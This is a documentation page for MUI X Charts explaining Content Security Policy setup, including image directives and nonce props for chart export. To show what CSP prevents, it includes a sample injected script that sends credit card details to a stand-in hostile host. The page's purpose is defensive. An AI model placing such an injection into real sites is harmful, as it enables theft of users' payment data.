---
title: Content Security Policy (CSP)
productId: x-charts
---

# Charts - Content Security Policy (CSP)

<p class="description">How to configure a Content Security Policy so MUI X Charts runs correctly and export works when your app restricts script and style sources.</p>

## What is a Content Security Policy (CSP)?

A Content Security Policy (CSP) mitigates cross-site scripting (XSS) attacks by requiring you to allowlist the sources your assets are loaded from.
The server sends this list in a response header.
For example, with a site at `https://example.com`, the CSP header `default-src: 'self';` lets you load assets from `https://example.com/*` and blocks all others.
If part of your site is vulnerable to XSS and renders unescaped user input, an attacker could inject something like:

```html
<script>
  sendCreditCardDetails('https://hostile.example');
</script>
```

The attacker could then run arbitrary code.
A strict CSP header prevents the browser from loading that script.

See the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP) for more on CSP.

## Setting up a CSP

MUI X Charts depends on Material UI.
Follow Material UI's [CSP implementation guide](/material-ui/guides/content-security-policy/#how-does-one-implement-csp) to set up a CSP.

### CSP for exporting charts

You can [export charts](/x/react-charts/export/) as images or PDFs with MUI X Charts.
When a CSP is set, you need to configure additional settings for exporting to work.

Enable `data:` and `blob:` URIs for images by adding these directives to your CSP header:

```text
Content-Security-Policy: img-src 'self' data: blob:;
```

If your CSP uses a nonce for scripts or styles (for example, `script-src 'nonce-<value>'`), provide the same nonce when exporting.

Pass the nonce to the `printOptions` and `imageExportOptions` props of the `toolbar` slot.

```tsx
<LineChartPro
  {...settings}
  showToolbar
  slotProps={{
    toolbar: {
      printOptions: { nonce },
      imageExportOptions: [
        { type: 'image/png', nonce },
        { type: 'image/jpeg', nonce },
        { type: 'image/webp', nonce },
      ],
    },
  }}
/>
```
